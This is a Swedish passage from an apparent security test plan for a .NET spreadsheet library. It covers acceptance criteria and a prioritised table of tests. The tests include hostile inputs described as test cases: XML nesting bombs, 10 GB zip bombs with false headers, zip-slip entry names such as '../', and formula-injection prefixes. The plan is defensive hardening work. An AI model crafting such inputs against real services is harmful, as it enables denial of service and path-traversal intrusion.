1. **Inga okontrollerade krascher.** Varje fil i korpusen ska ge ett av tre utfall: framgång,
   `Result` med fel, eller `InvalidDataException`. Det gäller fuzzkorpusen, attackfilerna och
   kompatibilitetsfilerna, och det gäller strömläsning, öppning, omräkning och sparning. Inget
   annat undantag, inget stackspill och ingen hängning över 30 sekunder. Det mäts i en
   barnprocess (6.3). Uppfyllt för korpusen 2026-11-24, efter att P05 och P06 åtgärdades. `corpus-check.ps1` kontrollerar det i egna processer.
2. **Ingen oavsiktlig filåtkomst och inget nätverk.** Med `strace` eller Process Monitor över
   hela korpusen ska den enda filåtkomsten vara den angivna sökvägen, och inga
   nätverksanrop får förekomma. Grep-testet ska vara grönt.
3. **Begränsad CPU och begränsat minne.** Med `KalkylLimits.Default` och 1 GB managed heap
   ska ingen fil i korpusen ge OOM. Ingen fil under 10 MB ska ta mer än 10 sekunder CPU att
   öppna. Uppfyllt för korpusen 2026-11-24, efter att P07 åtgärdades.
4. **Skydd mot DoS och zip-bomber.** S-01 till S-05 ska vara gröna i [C], också med en zip-bomb
   på 10 GB och med ett falskt huvud.
5. **Korrekt hantering av felaktiga filer.** F-12, S-10 och Z-03 till Z-07 ska vara gröna, och
   varje mål ska vara verifierat genom sabotage.
6. **Inga kända kritiska eller höga sårbarheter.** NuGet Audit ska vara grön på nivån `low`,
   och risk 1 till 6 i matrisen ska vara åtgärdade eller ha ett beslut.
7. **Förutsägbara och säkra felmeddelanden.** Varje fel ska ha en `ResultStatus` och ett
   meddelande som anger delen, bladet eller cellen. Inga stackspår, och inga sökvägar
   utöver den anroparen angav.
8. **Funktion.** Alla enhetstester och kompatibilitetstester ska vara gröna. Formlerna i
   kompatibilitetsfilerna ska stämma med Excels värden, och avvikelserna ska vara
   dokumenterade. Filer från skrivaren och dokumentmodellen ska öppnas i riktiga Excel
   utan reparation.
9. **Prestanda.** P-01 till P-11 ska ha en dokumenterad baslinje. Ingen försämring över 20 %
   mot baslinjen.
10. **Fuzzning.** Varje mål ska ha körts täckningsstyrt i minst 8 timmar utan fynd, och
    korpusen ska vara incheckad.

---

## 9. Testplan i prioritetsordning

I kolumnen **Grupp** betyder A vanliga filer, B manipulerade filer och C en isolerad
säkerhetsmiljö.

| Test-ID | Testnamn | Risk | Grupp | Förutsättningar | Steg | Förväntat resultat | Misslyckat om | Åtgärd vid brist |
|---|---|---|---|---|---|---|---|---|
| SEC-01 | XML-djup i celler, delade strängar och stilar | Kritisk | B | `HostileFiles` | Bygg `<is>`, `<si>` och `<font>` med 1 000, 10 000 och 100 000 nivåer. Öppna med strömläsaren och dokumentmodellen och mät tid och allokering. | `InvalidDataException` eller `Invalid` inom 1 sekund och under 100 MB allokerat. | Tid över 1 sekund, kvadratisk tillväxt eller annat undantag. | Gräns för djup i `CellXml`, `XmlParts.ReadRichTextAsync` och `StyleTable`. Lägg till ett djupfall i fuzzgeneratorn. |
| SEC-02 | Text över 32 767 tecken | Kritisk | B | Samma | Delad sträng, inline-sträng, cachat `t="str"`, bladnamn, `formatCode` och 1 000 000 tecken. | `InvalidDataException` eller `Invalid`. | Ett `ArgumentOutOfRangeException` eller något annat undantag. | Kontrollera i `CellXml.ToValue` och i läsningen av delade strängar. Lägg till regressionstest. |
| SEC-03 | Zip-bomb i full storlek och med falskt huvud | Hög | C | Container med `--memory=2g --network none`, generatorn i 6.2 | 10 GB uppackat, 1 GiB plus 1 byte, och ett huvud som anger 1 kB för 1 GB. | `Invalid` inom 100 ms. `InvalidDataException` från `LimitedStream`. | OOM, tid över 1 sekund, eller att mer än gränsen läses. | Kontrollera `CheckSize` och `LimitedStream`. |
| SEC-04 | Minne för delade strängar | Hög | B och C | Samma | 10, 30 och 60 miljoner `<si>` inom 1 GiB. | `Invalid` vid en gräns, eller toppminne under 2 GB. | Toppminne över 2 GB eller OOM. | `MaxSharedStrings`, eller läsning vid behov. |
| SEC-05 | Samtidiga uppladdningar | Hög | C | Container med `--memory=4g --cpus=2`, `dotnet-counters` | 8, 32 och 128 parallella, blandade filer på 50 MB. | Inga OOM, rätt svar och kö i trådpoolen som återgår. | OOM, hängning eller fel svar. | Dokumentera `SemaphoreSlim`. Överväg att omräkningen lämnar tråden ibland. |
| SEC-06 | Avbrott av tunga formler | Hög | B | Inga | VLOOKUP med O(n²) över 1 miljon rader och `CancellationTokenSource(5 s)`. | `OperationCanceledException` inom 6 sekunder. | Fortsätter mer än 1 sekund efter gränsen. | Kontrollera token i loopar i aggregatfunktioner och uppslag. |
| SEC-07 | Dubbla postnamn och postnamn för zip slip | Medel | B | `HostileFiles` med rå zip | Dubbletter, också skiftlägesokänsligt. `../`, `/`, `C:` och `\`. | `Invalid`, eller borttaget när filen sparas. Ingen fil utanför. | Tyst val av en av dubbletterna, eller namn som följer med. | Kontrollera i `OpenSeekableAsync`. |
| SEC-08 | Makron och aktivt innehåll i XLSM | Medel | A | En .xlsm med `vbaProject.bin`, ActiveX och OLE | Öppna, spara och läs `Workbook.HasMacros`. | Dokumenterat beteende, och ett val för att ta bort aktivt innehåll. | Makron följer med utan att anroparen kan upptäcka det. | Lägg till `HasMacros` och ett val för borttagning. |
| SEC-09 | Inget nätverk och ingen filåtkomst | Medel | C | Container med `--network none --read-only`, `strace` | Kör hela korpusen inklusive P09 och P10. | Inga nätverksanrop och inga filöppningar utom testfilen. | Något anrop alls. | Hitta källan och ta bort den. Lägg till grep-test. |
| SEC-10 | Felmeddelanden | Medel | A | Korpusen | Samla `Result.Error` och undantagsmeddelanden, och sök efter sökvägar och stackspår. | Bara anroparens sökväg och filens eget innehåll. | Serverns sökvägar, stackspår eller miljövariabler. | Ändra meddelandena, och dokumentera att de är för loggen. |
| SEC-11 | Formelinjektion vid export | Medel | A | Inga | Skriv `=`, `+`, `-` och `@` som text och läs XML:en. | `t="inlineStr"` och ingen `<f>`. | En `<f>` skapas. | Rätta skrivaren. |
| SEC-12 | Okända zip-varianter | Medel | B | Rå zip | LZMA, en krypterad post, zip64 med falska fält och 100 000 poster. | `Invalid`. | `NotSupportedException` eller ett annat undantag som inte fångas. | Fånga det i `OpenSeekableAsync`. |
| FUN-01 | Aggregat över hela kolumner | Medel | A | Inga | En cell i XFD1048576. Kör `SUM(A:XFD)`, `COUNT(1:1048576)` och `AVERAGE(A:A)`. | Samma svar som Excel. | `#NUM!`. | Aggregatfunktioner som bara går igenom celler som finns. |
| FUN-02 | Filformat | Medel | A | xls, xlsb, ods, krypterad fil, xltx | Öppna var och en. | Tydligt `Invalid`, eller korrekt läsning. | Fel status, eller ett otydligt meddelande. | Utöka `CheckSignatureAsync`. |
| FUN-03 | Kompatibilitet | Medel | A | `download.ps1` | `dotnet test tests/Avig.Kalkyl.Compatibility`. | Grönt. | Någon avvikelse. | Gör om fyndet till ett test i `CompatibilityFindingsTests`. |
| FUN-04 | Öppnas i Excel | Medel | A | Excel finns installerat | Öppna filer från skrivaren och sparade filer från dokumentmodellen. | Inget meddelande om reparation. | Excel vill reparera filen. | Felsök med OpenXmlValidator och Open XML SDK Productivity Tool. |
| FUZ-01 | Täckningsstyrd fuzzning | Medel | C | `libfuzzer-dotnet.exe` | `./fuzz.ps1 -Target <mål> -RuntimeSeconds 28800` per mål. | Inga fynd. | Ett fynd. | Gör om fyndet till ett test i `FuzzFindingsTests`. |
| FUZ-02 | Mutation av zip-binären (Z-03) | Medel | B | Ett nytt mål `zip-raw` | 50 000 indata i smoke-läge, och sabotage. | Inga fynd, och sabotaget ger fynd. | Ett fynd. | Rätta, och gör om fyndet till ett test. |
| FUZ-03 | Svep över heltalsattribut (Z-06) | Medel | B | Ett nytt svepmål | Varje attribut gånger varje gränsvärde. | `Invalid` eller rimligt värde. | Ett undantag som inte fångas. | Validera vid inläsning. |
| PRF-01 | Baslinjer P-01 till P-04 | Medel | A | BenchmarkDotNet på en dedikerad maskin | Kör och spara resultaten i `docs/benchmarks/`. | Baslinjer finns. | Försämring över 20 % i senare körning. | Profilera med `dotnet-trace`. |
| PRF-02 | Långvarig belastning och läckor (P-06, P-07, P-10) | Låg | C | Container, `dotnet-counters`, `dotnet-gcdump` | 4 timmar och 10 000 iterationer. | Stabilt minne. | Minnet trendar uppåt, eller objekt blir kvar. | Analysera med gcdump. |
| PRF-03 | Allokering per formel (P-11) | Låg | A | `dotnet-trace` | Profilera en kedja med 100 000 formler. | Under 5 kB per formel. | Över 20 kB per formel. | Optimera `Recalculator` och `Evaluator`. |
| SEC-10 (felkoder) | Se raden SEC-10 ovan. |
| FUN-01, PRF-01 (hela kolumner) | Cellagringen och formelindexet är omgjorda. 10 000 löpande `SUMIF(B:B,…)` tar 2,7 s i stället för 20,4 s (`docs/benchmarks/baseline.md`). |
| FUZ-01 (första körningen) | libFuzzer hittade två fel på en minut, som 50 000 smoke-indata hade missat. Det ena är ett fel i `System.Xml` i .NET 10, där en trasig XML-deklaration gav `ArgumentOutOfRangeException`. Det andra var `<sheet>` utanför `<sheets>`, som gav dubbla blad när filen sparades. Båda är rättade och har tester i `HostileFilesTests`. Efter rättningarna gav 2,6 miljoner indata inga fynd. |
| DEP-01 | NuGet Audit och lockfil | Låg | A | `Directory.Build.props` | Slå på Audit på nivån `low`, lägg till `packages.lock.json` och `RestoreLockedMode`. | Bygget är grönt. | En sårbarhet hittas. | Uppdatera beroendet, eller dokumentera undantaget. |
| DEP-02 | Licenser och SBOM | Låg | A | `nuget-license`, CycloneDX | Kör i CI. | Bara tillåtna licenser. | En okänd licens eller copyleft-licens i paketet. | Byt beroende. |

### Ordning

1. **Nu**, kritiska brister med låg arbetsinsats: SEC-02, därefter SEC-01. Båda ska få
   regressionstester och fall i fuzzgeneratorn.
2. **Före 1.0:**
   - SEC-03 till SEC-07 och SEC-12.
   - FUN-01, FUN-04 och FUZ-01 till FUZ-03.
   - DEP-01.
3. **Löpande:** PRF-01 till PRF-03, SEC-08 till SEC-11 och DEP-02.
